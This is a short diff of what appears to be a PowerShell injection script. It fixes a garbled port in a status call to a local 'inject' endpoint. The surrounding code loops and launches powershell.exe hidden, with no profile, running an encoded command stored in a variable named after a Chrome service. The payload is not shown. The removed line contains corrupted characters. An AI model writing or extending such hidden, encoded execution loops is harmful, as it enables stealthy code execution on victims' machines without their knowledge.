@@ -122,7 +122,7 @@ $successFile = "C:\Temp\success.txt"
 # Use a clear, infinite loop that we can break out of upon success
 while ($true) {
     # Announce the injection attempt
-    Invoke-WebRequest -Uri "http://localhost:8רוב/api/inject?status=Injecting-dewdrops"
+    Invoke-WebRequest -Uri "http://localhost:8080/api/inject?status=Injecting-dewdrops"
     
     # Run the hidden process and, crucially, WAIT for it to exit
     Start-Process -FilePath "powershell.exe" -ArgumentList "-nop", "-w", "hidden", "-EncodedCommand", "$Chrome_Service_Encoded" -Wait
